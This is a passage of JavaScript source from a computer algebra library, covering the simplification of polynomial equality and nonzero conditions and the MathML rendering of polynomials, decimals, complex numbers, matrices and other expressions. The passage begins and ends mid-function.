              //trying to avoid infinite recursion:
              if (x.operator === Condition.EQZ) {//?
                return addRest(add(newArray, {expression: newXExpression, operator: x.operator}), oldArray, i, y);
              }
              return addRest(add(newArray, y), oldArray, i, {expression: newXExpression, operator: x.operator});
            }
          }
        }
        if (newMethodEnabled && true) {
          // Condition.TRUE.andNotZero(ExpressionParser.parse('b*c-a*d')).andZero(ExpressionParser.parse('2*b*c-2*a*d+b*c*d+c*d-a*d^2')) + ''
          if (x.operator === Condition.NEZ && y.operator === Condition.EQZ) {
            // consider y = x * q + r, where q is not zero (? and x is not zero)
            // then y != r

            var pivot = getPivotMonomial(x.expression);
            var p = pivot.divide(Expression.getConstant(pivot));
            for (var iteratora = y.expression.summands()[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
              if (a.gcd(p).equals(p) || a.gcd(p).equals(p.negate())) {
                var q = a.divide(pivot);
                if (q instanceof Expression.Integer && !q.equals(Expression.ZERO)) {//TODO: when q is a multiplicaiton of other != 0 conditions
                  //?TODO: prevent infinite loop: how?
                  var r = y.expression.subtract(q.multiply(x.expression));
                  var rr = {expression: r, operator: Condition.NEZ};
                  var flag = false;
                  if (true) {
                    //! 2020-07-05
                    var flag = false;
                    for (var ii = 0; ii < oldArray.length; ii++) {
                      var n = oldArray[ii];
                      if (n.operator === Condition.EQZ) {
                        var g = n.expression.gcd(rr.expression);
                        if (!g.equals(Expression.ONE) && !g.equals(Expression.ONE.negate())) {
                          flag = true;
                        }
                      }
                    }
                  }
                  //flag = oldArray.length < add(oldArray.slice(0), rr).length;//?TODO: better way
                  if (flag) {
                    return addRest(add(add(newArray, x), rr), oldArray, i - 1, y);
                  }
                }
              }
            }

          }
        }
        //!
        if (!newMethodEnabled || true) {

        var p = null;
        var pOperator = null;
        var pp = null;
        var other = null;
        var px = Expression.getMultivariatePolynomial(x.expression);
        var py = Expression.getMultivariatePolynomial(y.expression);
        //var xy = Expression.getMultivariatePolynomial(x.expression.multiply(y.expression));

        if (y.operator === Condition.EQZ && py != null && py.p.getDegree() !== 1) {
          var tmp = Expression.getMultivariatePolynomial(py.p.getCoefficient(0));
          if (tmp != null) {
            var v = tmp.v;
            if (v instanceof Expression.Symbol && tmp.p.getDegree() === 1) {
              py = {p: Polynomial.toPolynomial(y.expression, v), v: v};
            }
          }
        }

        //console.assert(px != null && py != null);

        if (//xy != null &&
            //x.operator === Condition.EQZ &&
            //y.operator === Condition.EQZ &&
            px != null && py != null) {


          //!new 2019-24-12
          /*
          //TODO: remove - buggy - ?
          if (!newMethodEnabled && px != null && py != null && px.v.equals(py.v) && px.p.getDegree() !== 1 && py.p.getDegree() !== 1 && x.operator === Condition.EQZ && y.operator === Condition.EQZ) {
            //TODO: test, fix
            var tmp1 = py.p.getDegree() >= px.p.getDegree() ? Polynomial.pseudoRemainder(py.p, px.p) : py.p;
            var tmp2 = tmp1.calcAt(px.v);
            var tmp = {expression: tmp2, operator: y.operator};
            newArray = add(newArray, tmp);
            if (newArray == null) {
              return null;
            }
            return addRest(newArray, oldArray, i, x);
          }
          */
          //!?

          //if (px != null && px.p.getDegree() !== 1 && py == null) {
            //py = {p: Polynomial.toPolynomial(y.expression, px.v), v: px.v};
            //if (xy.v === py.v) {
            //  py = null;
            //}
          //}
          //if (px == null && py != null && py.p.getDegree() !== 1) {
            //px = {p: Polynomial.toPolynomial(x.expression, py.v), v: py.v};
            //if (xy.v === px.v) {
            //  px = null;
            //}
          //}
          //if (px == null && py == null) {//?TODO:
          //  px = {p: Polynomial.toPolynomial(x.expression, xy.v), v: xy.v};
          //  py = {p: Polynomial.toPolynomial(y.expression, xy.v), v: xy.v};
          //}

          if (y.operator === Condition.EQZ && py != null && py.p.getDegree() === 1 &&
              x.operator === Condition.EQZ && px != null && px.p.getDegree() === 1) {
            //TODO: fix !!!
            //TODO: test linear systems
            if (Expression._getReplacement(y.expression, px.v).equals(px.v) && Polynomial.toPolynomial(y.expression, px.v).getDegree() === 0) {
              px = null;
            }
            if (Expression._getReplacement(x.expression, py.v).equals(py.v) && Polynomial.toPolynomial(x.expression, py.v).getDegree() === 0) {
              py = null;
            }

            if (px != null && py != null) { // TODO: ?
              if (!(px.p.getCoefficient(1) instanceof Expression.Integer)) {
                px = null;
              }
              if (!(py.p.getCoefficient(1) instanceof Expression.Integer)) {
                py = null;
              }
            }

            if (px != null && py != null) {

            //if (px.v.symbol < py.v.symbol) {//!
            if (px.v.compare4Addition(py.v) < 0) {
              px = null;
            }
            //}

            }
          }

          if (y.operator === Condition.EQZ && py != null && py.p.getDegree() === 1) {
            pp = py;
            p = x.expression;
            pOperator = x.operator;
            other = y;
          }
          if (x.operator === Condition.EQZ && px != null && px.p.getDegree() === 1) {
            pp = px;
            p = y.expression;
            pOperator = y.operator;
            other = x;
          }
        }
        if (pp != null) {
          var ok = false;
          // x = -b / a if a !== 0
          ok = ok || pp.p.getDegree() === 1 && Expression.isConstant(pp.p.getCoefficient(1)) && Expression.isConstant(pp.p.getCoefficient(0));
          // a * x + 1 = function (0) { return a !== 0 && x !== function (0) { return x = -1 / a; }; }
          ok = ok || pp.p.getDegree() === 1 && Expression.isConstant(pp.p.getCoefficient(0)) && !pp.p.getCoefficient(0).equals(Expression.ZERO) && Expression.has(p, Expression.Exponentiation);
          //if (Expression.isSingleVariablePolynomial(p) && pp.v instanceof Expression.Symbol && Expression.getVariable(pp.p.getCoefficient(0)) != null && Expression.getVariable(pp.p.getCoefficient(0)).compare4Multiplication(pp.v) > 0) {
          //  ok = ok || pp.p.getDegree() === 1 && Expression.isConstant(pp.p.getCoefficient(1));
          //}
          //if ((pp.p.getCoefficient(1) instanceof Expression.Integer || polynomial.divideAndRemainder(pp.p, "undefined") != undefined || (!pp.p.getCoefficient(0).equals(Expression.ZERO) && Expression.isConstant(pp.p.getCoefficient(0)))) &&
          //    (!newMethodEnabled || Expression.isConstant(pp.p.getCoefficient(0)) || (pp.p.getCoefficient(1) instanceof Expression.Integer && Expression.isSingleVariablePolynomial(polynomial.calcAt(pp.p.getCoefficient(0).negate().divide(pp.p.getCoefficient(1)))))) && //!? new 2020-06-18
          //    !(p instanceof Expression.Symbol) || (polynomial.calcAt(pp.p.getCoefficient(0).negate().divide(pp.p.getCoefficient(1))) instanceof Expression.Integer)) {//TODO: replace only if the result is more simple (?): a*v != 0 or b != 0
          if (ok) {
            var alpha = pp.p.getCoefficient(0).negate().divide(pp.p.getCoefficient(1));
            //var polynomial = Polynomial.toPolynomial(p, pp.v);
            //var a = polynomial.calcAt(alpha);
            var a = Expression._substitute(p, pp.v, alpha, {uniqueObject: 1});
            if (!a.equals(p)) {
              var tmp = {
                operator: pOperator,
                expression: a
              };
              newArray = add(newArray, tmp);
              if (newArray == null) {
                return null;
              }
              if (true) {
                return addRest(newArray, oldArray, i, other);
              } else {
                y = other;
              }
            } else {
              newArray.push(x);
            }
          } else {
            newArray.push(x);
          }
        } else {
          newArray.push(x);
        }
        } else {
          newArray.push(x);
        }
      }
    }
    newArray.push(y);

    /*
    var allNEZ = function* (array) {
      for (var i = 0; i < array.length; i += 1) {
        var y = array[i];
        if (y.operator === Condition.EQZ) {
          for (var j = 0; j < array.length; j += 1) {
            var x = array[j];
            if (x.operator === Condition.NEZ) {
              // Condition.TRUE.andNotZero(ExpressionParser.parse('b*c-a*d')).andZero(ExpressionParser.parse('2*b*c-2*a*d+b*c*d+c*d-a*d^2')) + ''
              // consider y = x * q + r, where q is not zero
              // then y != r

              var pivot = getPivotMonomial(x.expression);
              var p = pivot.divide(Expression.getConstant(pivot));
              for (var iteratora = y.expression.summands()[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
                if (a.gcd(p).equals(p) || a.gcd(p).equals(p.negate())) {
                  var q = a.divide(pivot);
                  if (q instanceof Expression.Integer && !q.equals(Expression.ZERO)) {//TODO: when q is a multiplicaiton of other != 0 conditions
                    //?TODO: prevent infinite loop: how?
                    var r = y.expression.subtract(q.multiply(x.expression));
                    //if (oldArray.length < add(oldArray.slice(0), {expression: r, operator: Condition.NEZ}).length) {//?TODO: better way
                    //  return addRest(add(add(newArray, x), {expression: r, operator: Condition.NEZ}), oldArray, i - 1, y);
                    //}
                    yield r;
                  }
                }
              }
            }
          }
        }
      }

    };

    for (var i = 0; i < newArray.length; i += 1) {
      var y = newArray[i];
      if (y.operator === Condition.EQZ) {
        for (var iteratornez = allNEZ(newArray)[globalThis.Symbol.iterator](), nez = iteratornez.next().value; nez != null; nez = iteratornez.next().value) {
          var g = y.expression.gcd(nez);
          if (!g.equals(Expression.ONE) && !g.equals(Expression.ONE.negate())) {
            return add(newArray, {expression: y.expression.divide(g), operator: Condition.EQZ});
          }
        }
      }
    }
    */

    //?
    //TODO: only when multiple variables and has `f != 0`
    //TODO: test with replacements
    //TODO: !!!
    if (newMethodEnabled && true) {
    var base = new Condition(newArray);
    for (var i = 0; i < newArray.length; i += 1) {
      var y = newArray[i];
      if (y.operator === Condition.EQZ) {
        var f = y.expression;
        /*
        //if (!Expression.isSingleVariablePolynomial(f)) {// performace (?)
          if (!Expression.isConstant(f.divide(Expression.simpleDivisor(f)))) {
            while (!Expression.isConstant(f)) {
              var d = Expression.simpleDivisor(f);
              var q = f.divide(d);
              if (new Condition(newArray.slice(0, i).concat(newArray.slice(i + 1))).andZero(d).isFalse()) { // TODO: fix
                return add(newArray, {expression: d, operator: Condition.NEZ});
              }
              f = q;
            }
          }
        //}
        */
          var g = null;
          for (var iterators = f.summands()[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
            var a = s.divide(Expression.getConstant(s));
            if (g == null) {
              g = a;
            } else {
              g = g.gcd(a);
            }
          }
          if (!g.equals(Expression.ONE) && f instanceof Expression.Addition) {
            // can g be equal to 0 ?
            if (new Condition(newArray.slice(0, i).concat(newArray.slice(i + 1))).andZero(g).isFalse()) { // TODO: fix
              return add(newArray, {expression: g, operator: Condition.NEZ});
            }
          }

      }
    }
    }
    //?

    return newArray;
  };
  
  //!new 2021-10-06
  if (e instanceof Expression.Division) {//TODO: !?
    return this._and(operator, e.getNumerator()).andNotZero(e.getDenominator());
  }
  //TODO: other cases, other types
  var c = this;
  if (true && operator === Condition.EQZ) {
    var getVariable1 = function (e) {
      var candidate = undefined;
      for (var iterators = e.summands()[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
        for (var iteratorf = s.factors()[globalThis.Symbol.iterator](), f = iteratorf.next().value; f != null; f = iteratorf.next().value) {
          var b = f instanceof Expression.Exponentiation ? f.a : f;
          if (b instanceof Expression.Symbol) {
            if (candidate == undefined || b.symbol < candidate.symbol) {
              candidate = b;
            }
          }
        }
      }
      return candidate;
    };
    var v = getVariable1(e);
    if (v != undefined && Polynomial.of(e)._hasIntegerLikeCoefficients()) { // a^(1/2) or a/2
      var ep = Polynomial.toPolynomial(e, v);
      for (var iteratorx = this.array[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
        if (x.operator === Condition.EQZ) {
          if (Polynomial.of(x.expression)._hasIntegerLikeCoefficients() && getVariable1(x.expression).symbol >= v.symbol) {
            var xp = Polynomial.toPolynomial(x.expression, v);
            if (xp.getDegree() >= 1) {
              var g = Polynomial.polynomialGCD(ep, xp);//TODO: !?
              if (g.getDegree() === 0) { // it is slow to compute resultant, while it should be zero when gcd != 1
                var res = Polynomial.resultant(ep, xp);
                c = c.andZero(res);
                if (c.isFalse()) {
                  return c;
                }
              }
            }
          }
        }
      }
    }
  }
  //!
  
  var newArray = add(c.array, {
    operator: operator,
    expression: e
  });
  if (newArray == null) {
    return Condition.FALSE;
  }
  if (newArray.length === 0) {
    return Condition.TRUE;
  }

  return new Condition(newArray);
};

Condition.prototype.andNotZero = function (e) {
  return this._and(Condition.NEZ, e);
};
Condition.prototype.andZero = function (e) {
  return this._and(Condition.EQZ, e);
};
Condition.prototype.andGreaterZero = function (e) {
  return this._and(Condition.GTZ, e);
};
Condition.prototype.and = function (b) {
  if (!(b instanceof Condition)) {
    throw new TypeError();
  }
  var c = this;
  for (var i = 0; i < b.array.length; i += 1) {
    c = c._and(b.array[i].operator, b.array[i].expression);
  }
  return c;
};
Condition.prototype.isFalse = function () {
  return this === Condition.FALSE;
};
Condition.prototype.isTrue = function () {
  return this === Condition.TRUE;
};
Condition.prototype.toString = function (options) {
  if (this === Condition.TRUE || this === Condition.FALSE) {
    // 1) no need; 2) no way to distinguish TRUE and FALSE
    throw new TypeError();
  }
  if (this.array.length === 0) {
    // assertion
    throw new TypeError();
  }
  var s = '';
  for (var i = 0; i < this.array.length; i += 1) {
    s += (i !== 0 ? ', ' : '') + this.array[i].expression.toString(options) + this.array[i].operator;
  }
  return s;
};

Condition.TRUE = new Condition(new Array(0));
Condition.FALSE = new Condition(undefined);


Condition.prototype.getSolutionFor = function (variable) {
  var condition = this;
  if (condition.array == null) {
    return null;
  }
  for (var i = 0; i < condition.array.length; i += 1) {
    var c = condition.array[i];
    if (c.operator === Condition.EQZ) {
      var p = Polynomial.toPolynomial(c.expression, variable);
      if (p.getDegree() === 1) {
        return p.getroots()[0];
      }
    }
  }
  return null;
};

  Condition.prototype.updateExpression = function (e, options) {
    return this.andNotZero(e).isFalse() ? Expression.ZERO : e;
    //var symbol = new Expression.Symbol('$e');
    //var condition = options && options.flag1 ? this : new Condition(this.array.filter(function (x) { return x.expression instanceof Expression.Symbol && x.operator === Condition.EQZ; }));
    //var c2 = condition.andZero(e.subtract(symbol));
    //return c2.getSolutionFor(symbol);
    //return e;
  };

self.Condition = Condition;

})();
(function () {
"use strict";

 //TODO:

 //TODO:

 //TODO:
//TODO: remove - ?

 //!TODO: remove

Polynomial.prototype.toString = function (options) {
  options = options || {};
  return this.toExpression(options.polynomialVariable || new Expression.Symbol("x")).toString(options);
};

Polynomial.prototype.toMathML = function (options) {
  options = options || {};
  return this.toExpression(options.polynomialVariable || new Expression.Symbol("x")).toMathML(options);
};

Expression.Polynomial.prototype.toString = function (options) {
  return this.polynomial.toString(options);
};

Expression.Polynomial.prototype.toMathML = function (options) {
  return this.polynomial.toMathML(options);
}; // coefficient - Expression
// variable - Expression


var printPartOfAddition = function (isLast, isFirst, coefficient, variable, options) {
  if (coefficient.equals(Expression.ZERO)) {
    return isLast && isFirst ? Expression.ZERO.toMathML() : "";
  }

  var isNegative = false;

  if (coefficient.isNegative() && !isFirst) {
    isNegative = true;
    coefficient = coefficient.negateCarefully(); //?
  }

  var precedenceOfMultiptication = new Expression.Multiplication(Expression.ZERO, Expression.ZERO).getPrecedence();
  var areBracketsRequired = coefficient.getPrecedence() < precedenceOfMultiptication; //?

  var c = coefficient.equals(Expression.ONE); //TODO: fix

  return (isFirst ? '' : '') + (!isFirst && isNegative ? '<mo form="infix">&minus;</mo>' : '') + (!isFirst && !isNegative ? '<mo form="infix">+</mo>' : '') + (c ? '' : '<mrow>') + (c || !areBracketsRequired ? '' : '<mrow><mo>(</mo>') + (c ? '' : coefficient.toMathML(options)) + (c || !areBracketsRequired ? '' : '<mo>)</mo></mrow>') + (c ? '' : '<mo>&sdot;</mo>') + variable.toMathML(options) + (c ? '' : '</mrow>');
};

var decimalToMathML = function (decimal) {
  var match = /^([+\-])?(\d+\.?\d*(?:\(\d+\)\d*)?)(?:[eE]\+?(\-?\d+))?$/.exec(decimal);
  var groups = {
    sign: match[1] || "",
    significand: match[2] || "",
    exponent: match[3] || ""
  };
  return (groups.exponent !== "" ? "<mrow>" : "") + (groups.sign !== "" ? "<mrow>" : "") + (groups.sign === "+" ? "<mo>+</mo>" : "") + (groups.sign === "-" ? "<mo>&minus;</mo>" : "") + "<mn>" + numberFormat.format(groups.significand.replace(/[\(\)]/g, '')).replace(/^[\s\S]+$/g, function (p) {
    var a = groups.significand.indexOf('(');
    var b = groups.significand.lastIndexOf(')');

    if (a === -1 || b === -1) {
      return p;
    }

    var digitLength = numberFormat.format('0').trim().length;
    var i = p.length - (groups.significand.length - a - '('.length - ')'.length) * digitLength;
    var j = p.length - (groups.significand.length - b - ')'.length) * digitLength;
    return p.slice(0, i) + '<span style="text-decoration:overline;">' + p.slice(i, j) + '</span>' + p.slice(j);
  }) + "</mn>" + (groups.sign !== "" ? "</mrow>" : "") + (groups.exponent !== "" ? "<mo lspace=\"0\" rspace=\"0\">&sdot;</mo>" + "<msup>" + "<mn>" + numberFormat.format('10') + "</mn>" + decimalToMathML(groups.exponent) + "</msup>" : "") + (groups.exponent !== "" ? "</mrow>" : "");
};

var complexToMathML = function (real, imaginary) {
  if (imaginary.replace(/<[^>]+>/g, '') === '1') {
    return '<mrow>' + real + '<mo>+</mo><mi>&ii;</mi></mrow>';
  }

  if (imaginary.replace(/<[^>]+>/g, '').replace(/&minus;/g, '-') === '-1') {
    return '<mrow>' + real + '<mo>&minus;</mo><mi>&ii;</mi></mrow>';
  }

  if (real === '') {
    return '<mrow>' + imaginary + '<mo>' + (/<msup>/.test(imaginary) || /[^0-9]/.test(imaginary) ? '&sdot;' : '&it;') + '</mo><mi>&ii;</mi></mrow>';
  }

  var signBetween = '+';

  if (/<mrow><mo>&minus;<\/mo><mn>([^<]*)<\/mn><\/mrow>(?!<\/msup>)/.test(imaginary)) {
    signBetween = '-';
    imaginary = imaginary.replace(/<mrow><mo>&minus;<\/mo><mn>([^<]*)<\/mn><\/mrow>(?!<\/msup>)/g, '<mn>$1</mn>');
  }

  return '<mrow>' + real + '<mo>' + (signBetween === '-' ? '&minus;' : '+') + '</mo>' + '<mrow>' + imaginary + '<mo>' + (/<msup>/.test(imaginary) || /[^0-9]/.test(imaginary) ? '&sdot;' : '&it;') + '</mo>' + '<mi>&ii;</mi>' + '</mrow>' + '</mrow>';
};

Expression._decimalToMathML = decimalToMathML;
Expression._complexToMathML = complexToMathML;

function isConstant(e) {
  if (e instanceof Expression.NonSimplifiedExpression) {
    return false;
  }

  if (e instanceof Expression.Matrix) {
    return false;
  }

  if (e instanceof Expression.Polynomial) {
    return false;
  }

  return Expression.isConstant(e);
}

var groupByTerm = function (e) {
  if (e instanceof Expression.Division || e instanceof Expression.Addition) {
    var numerator = e.getNumerator();
    var denominator = e.getDenominator(); //TODO: fix

    var denominatorContent = denominator instanceof Expression.Integer ? denominator : (Expression.getMultivariatePolynomial(denominator) || {
      p: {
        getContent: function () {
          return Expression.ONE;
        }
      }
    }).p.getContent();
    var denominatorRest = denominator.divide(denominatorContent);

    if (isConstant(denominatorContent)) {
      //TODO: fix when the content has multiple variables
      var summands = [];

      for (var iteratorsummand = numerator.summands()[globalThis.Symbol.iterator](), summand = iteratorsummand.next().value; summand != null; summand = iteratorsummand.next().value) {
        summands.push(summand);
      }

      var map = {}; //TODO: FIX, test(?)

      summands.reverse();

      for (var i = 0; i < summands.length; i += 1) {
        var summand = summands[i]; //var constant = Expression.getConstant(summand); - ?

        var constant = Expression.ONE;

        for (var iteratorfactor = summand.factors()[globalThis.Symbol.iterator](), factor = iteratorfactor.next().value; factor != null; factor = iteratorfactor.next().value) {
          if (isConstant(factor)) {
            constant = constant.multiply(factor);
          }
        }

        var term = summand.divide(constant);
        var key = "_" + term.toString();
        map[key] = map[key] || {
          constant: Expression.ZERO,
          term: term
        };
        map[key].constant = map[key].constant.add(constant.divide(denominatorContent));
      }

      var result = null;

      for (var key in map) {
        if (Object.prototype.hasOwnProperty.call(map, key)) {
          var constant = map[key].constant;
          var term = map[key].term;
          var s = false;

          if (result != null && constant.isNegative()) {
            constant = constant.negate();
            s = true;
          }

          var x = new NonSimplifiedExpression(term.equals(Expression.ONE) ? constant : constant.equals(Expression.ONE) ? map[key].term : new Expression.Multiplication(constant, map[key].term));
          result = result == null ? x : new Expression.Addition(result, s ? new Expression.Multiplication(Expression.ONE.negate(), x) : x);
        }
      }

      if (!denominatorRest.equals(Expression.ONE)) {
        result = new Expression.Division(result, denominatorRest);
      }

      return new NonSimplifiedExpression(result);
    }
  }

  return undefined;
};

var getRounding = function (options) {
  var rounding = options != undefined ? options.rounding : undefined;

  if (options != undefined && rounding == undefined && options.fractionDigits != undefined && options.fractionDigits !== -1) {
    console.debug('deprecated fractionDigits, use rounding instead');
    rounding = {
      fractionDigits: options.fractionDigits
    };
  }

  return rounding;
}; //TODO: move


Expression.toDecimalString = function (x, options) {
  var rounding = getRounding(options);

  if (rounding != null) {
    if (isConstant(x)) {
      return toDecimalStringInternal(x, rounding, decimalToMathML, complexToMathML);
    } else if (!Expression.has(x, NonSimplifiedExpression)) {
      var grouped = groupByTerm(x);

      if (grouped != undefined) {
        return grouped.toMathML(options);
      }
    }
  }

  return undefined;
};

var getPrecedence = function (x, options) {
  var rounding = getRounding(options);

  if (rounding != null && isConstant(x.unwrap()) && Expression.has(x.unwrap(), Expression.Complex)) {
    if (!x.unwrap().equals(Expression.I)) {
      return new Expression.Addition(Expression.ONE, Expression.ONE).getPrecedence();
    }
  }

  return x.getPrecedence();
};

Expression.idCounter = 0;

Expression.id = function () {
  return (Expression.idCounter += 1).toString();
}; //TODO: ?


Expression.escapeHTML = function (s) {
  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
};

Expression.Matrix.prototype.toMathML = function (options) {
  var x = this.matrix;
  options = Expression.setTopLevel(true, options);
  var useMatrixContainer = options.useMatrixContainer == undefined ? true : options.useMatrixContainer; //TODO: fix!

  var braces = options.useBraces == undefined ? undefined : options.useBraces;
  var columnlines = options.columnlines == undefined ? 0 : options.columnlines;
  var variableNames = options.variableNames == undefined ? undefined : options.variableNames;
  var verticalStrike = options.verticalStrike == undefined ? -1 : options.verticalStrike;
  var horizontalStrike = options.horizontalStrike == undefined ? -1 : options.horizontalStrike;
  var cellIdGenerator = options.cellIdGenerator == undefined ? undefined : options.cellIdGenerator;
  var pivotCell = options.pivotCell == undefined ? undefined : options.pivotCell;
  var isLUDecomposition2 = options.isLUDecomposition2 == undefined ? undefined : options.isLUDecomposition2;
  var highlightRow = options.highlightRow == undefined ? -1 : options.highlightRow;
  var highlightCol = options.highlightCol == undefined ? -1 : options.highlightCol;
  options = Object.assign({}, options, {
    useBraces: undefined,
    columnlines: undefined,
    variableNames: undefined,
    verticalStrike: undefined,
    horizontalStrike: undefined,
    cellIdGenerator: undefined,
    pivotCell: undefined,
    isLUDecomposition2: undefined,
    highlightRow: undefined,
    highlightCol: undefined
  });
  var result = "";
  var rows = x.rows();
  var cols = x.cols();
  var i = -1; //TODO: remove `Expression.id()`

  var containerId = options.idPrefix + "-" + Expression.id();

  if (useMatrixContainer) {
    result += "<munder accentunder=\"true\">"; // <menclose href="#"> will not be supported by MathML Core, so using <mrow>

    result += '<mrow id="' + containerId + '" data-matrix="' + Expression.escapeHTML(x.toString()) + '" draggable="true" tabindex="0" contextmenu="matrix-menu">';
  }

  result += braces == undefined ? '<mrow><mo>(</mo>' : '<mrow>' + (braces[0] === ' ' ? '' : '<mo>' + braces[0] + '</mo>');
  var columnlinesAttribute = "";

  if (columnlines !== 0 && cols - 1 > 0) {
    var k = -1;

    while (++k < cols - 1) {
      columnlinesAttribute += cols - 1 + columnlines === k ? "solid " : "none ";
    } // whitespace


    columnlinesAttribute = columnlinesAttribute.slice(0, -1);
  } //! 2017-07-06 rowspacing="0ex" was added to make it look better with Native MathML (when it is supported) and to have the same style as in mathml.css
  //  rowspacing="0ex" is also needed when verticalStrike !== -1


  var useColumnspacing = verticalStrike !== -1 || horizontalStrike !== -1 || pivotCell != undefined || cellIdGenerator != undefined;
  result += "<mtable" + " rowspacing=\"0ex\"" + (useColumnspacing ? " columnspacing=\"0em\"" : "") + (variableNames != undefined ? " columnalign=\"right\"" : "") + (columnlinesAttribute !== "" ? " columnlines=\"" + columnlinesAttribute + "\"" : "") + ">";

  while (++i < rows) {
    var j = -1;

    if (variableNames != undefined) {
      // TODO: fix?
      //TODO: use code from polynomialToExpression3 (shared)
      var row = "";
      var wasNotZero = false;

      while (++j < cols - 1) {
        // TODO: fix `new Expression.Symbol()`
        row += "<mtd>";
        row += printPartOfAddition(j === cols - 2, !wasNotZero, x.e(i, j), new Expression.Symbol(variableNames[j]), options);
        row += "</mtd>";
        wasNotZero = wasNotZero || !x.e(i, j).equals(Expression.ZERO);
      }

      row += "<mtd><mo>=</mo></mtd><mtd>" + x.e(i, cols - 1).toMathML(options) + "</mtd>";

      if (wasNotZero || !x.e(i, cols - 1).equals(Expression.ZERO)) {
        result += "<mtr>";
        result += row;
        result += "</mtr>";
      }
    } else {
      result += "<mtr>";

      while (++j < cols) {
        result += "<mtd" + (cellIdGenerator != undefined ? " id=\"" + cellIdGenerator(i, j) + "\"" : "") + ">";

        if (pivotCell != undefined && i === pivotCell.i && j === pivotCell.j) {
          result += "<mrow style=\"font-weight: bolder\">";
          result += "<menclose notation=\"circle\">";
        }

        if (horizontalStrike === i) {
          result += "<menclose notation=\"horizontalstrike\">";
        }

        if (verticalStrike === j) {
          result += "<menclose notation=\"verticalstrike\">";
        } // <mpadded> is an extra element, it is too many elements if to use it, which can cause performance problems


        if (useColumnspacing) {
          result += "<mpadded width=\"+0.8em\" lspace=\"+0.4em\">";
        }

        var highlight = j < i && isLUDecomposition2 || highlightRow === i && (columnlines === 0 || j <= cols - 1 + columnlines) || highlightCol === j;

        if (highlight) {
          result += "<mrow mathbackground=\"#80FF80\" mathcolor=\"#3C78C2\">";
        }

        result += x.e(i, j).toMathML(options);

        if (highlight) {
          result += "</mrow>";
        }

        if (useColumnspacing) {
          result += "</mpadded>";
        }

        if (verticalStrike === j) {
          result += "</menclose>";
        }

        if (horizontalStrike === i) {
          result += "</menclose>";
        }

        if (pivotCell != undefined && i === pivotCell.i && j === pivotCell.j) {
          result += "</menclose>";
          result += "</mrow>";
        }

        result += "</mtd>";
      }

      result += "</mtr>";
    }
  }

  result += "</mtable>";
  result += braces == undefined ? '<mo>)</mo></mrow>' : (braces[1] === ' ' ? '' : '<mo>' + braces[1] + '</mo>') + '</mrow>';

  if (useMatrixContainer) {
    result += '</mrow>';
    result += "<mtext>";
    result += "<button type=\"button\" class=\"matrix-menu-show\" data-for-matrix=\"" + containerId + "\" aria-haspopup=\"true\"></button>";
    result += "</mtext>";
    result += "</munder>";
  }

  return result;
};

Expression.Determinant.prototype.toMathML = function (options) {
  var x = this;

  if (x.a instanceof Expression.Matrix || x.a instanceof NonSimplifiedExpression && x.a.e instanceof Expression.Matrix) {
    options = Object.assign({}, options, {
      useBraces: ["|", "|"]
    }); //TODO: fix

    return x.a.toMathML(options);
  } //return "<mrow><mo>|</mo>" + x.a.toMathML(options) + "<mo>|</mo></mrow>";


  return Expression.Function.prototype.toMathML.call(this, options); // det(X)
};

Expression.Transpose.prototype.toMathML = function (options) {
  var x = this; //TODO: ^T ?
  // https://www.w3.org/TR/MathML3/chapter4.html#contm.transpose

  var f = this.getPrecedence() >= x.a.getPrecedence();
  return "<msup>" + (f ? "<mrow><mo>(</mo>" : "") + x.a.toMathML(options) + (f ? "<mo>)</mo></mrow>" : "") + "<mi>T</mi>" + "</msup>";
};

Expression.ComplexConjugate.prototype.toMathML = function (options) {
  var x = this; // https://w3c.github.io/mathml/chapter4-d.html#contm.conjugate

  return "<mover accent=\"true\">" + x.a.toMathML(options) + "<mo>Â¯</mo>" + "</mover>";
};

Expression.SquareRoot.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);

  if (d != undefined) {
    return d;
  }

  return "<msqrt>" + this.a.toMathML(Expression.setTopLevel(true, options)) + "</msqrt>";
};

Expression.NthRoot.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);

  if (d != undefined) {
    return d;
  }

  console.assert(typeof this.n === "number" && Math.floor(this.n) === this.n && this.n >= 3);
  return "<mroot>" + this.a.toMathML(Expression.setTopLevel(true, options)) + "<mn>" + numberFormat.format(this.n.toString()) + "</mn>" + "</mroot>";
};

Expression.denotations = {};

Expression.Function.prototype.toMathML = function (options) {
  var d = Expression.toDecimalString(this, options);

  if (d != undefined) {
    return d;
  }

  var x = this;
  var fa = !(x.a instanceof Expression.Matrix) && !(x.a instanceof NonSimplifiedExpression && x.a.e instanceof Expression.Matrix); //?
  //TODO: fix

  return "<mrow>" + "<mi>" + (Expression.denotations[x.name] || x.name) + "</mi>" + "<mo>&af;</mo>" + (fa ? "<mrow><mo>(</mo>" : "") + x.a.toMathML(Expression.setTopLevel(true, options)) + (fa ? "<mo>)</mo></mrow>" : "") + "</mrow>";
};

Expression.Division.prototype.toMathML = function (options) {
  if (options != null && options.nofractions) {
    return Expression.BinaryOperation.prototype.toMathML.call(this, options);
  }

  var d = Expression.toDecimalString(this, options);

  if (d != undefined) {
    return d;
  }

  var x = this;
  var denominator = x.getDenominator();
  var numerator = x.getNumerator(); //???
  //if (numerator.isNegative()) {
  //  return "<mrow><mo>&minus;</mo>" + x.negateCarefully().toMathML(options) + "</mrow>";
  //}

  return "<mfrac>" + numerator.toMathML(Expression.setTopLevel(true, options)) + denominator.toMathML(Expression.setTopLevel(true, options)) + "</mfrac>";
};

Expression.numberFormat = {
  format: function (number) {
    return number.toString();
  }
};
var decimalNumberRegExp = new RegExp('\\p{Decimal_Number}', 'u');

var replaceSimpleDigit = function (codePoint) {
  var i = 0;

  while (decimalNumberRegExp.test(String.fromCodePoint(codePoint - i))) {
    i += 1;
  }

  return i === 0 ? -1 : (i - 1) % 10;
};

var cachedFormatData = {
  format: null,
  decimalSeparator: '.',
  decimalZeroOffset: 0
}; // only for non-negative integers without groupping, but large

var numberFormat = {
  format: function (string) {
    var getDecimalSeparator = function () {
      var s = Expression.numberFormat.format(1.5).trim();
      var tmp = /[Ù«,\.]/.exec(s);

      if (tmp == null) {
        console.error(s);
        return '.';
      }

